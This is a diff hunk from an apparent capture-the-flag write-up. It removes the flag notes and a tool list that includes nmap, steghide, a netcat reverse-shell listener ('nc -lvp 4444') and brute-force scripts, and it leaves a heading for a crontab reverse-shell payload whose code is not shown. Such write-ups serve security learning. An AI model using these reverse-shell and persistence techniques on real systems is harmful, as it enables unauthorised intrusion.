@@ -104,27 +104,8 @@ Removed traces after escalation.
 
 ---
 
-## Final Notes and Flag
-
-- Flag retrieved post root shell.
-- Challenge complete.
-
----
-
-## Tools and Commands Used
-
-- `nmap -sC -sV -p- <target>`
-- `strings <file>`
-- `exiftool <image>`
-- `unzip <file>`
-- `steghide extract -sf <file>`
 - Morse code decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
 - Multitap cipher decoder: https://www.dcode.fr/multitap-abc-cipher
-- Reverse shell listener: `nc -lvp 4444`
-- Brute force scripts with dictionary
-
----
-
 ## Reverse Shell Payload (used in crontab)
 
 ```python
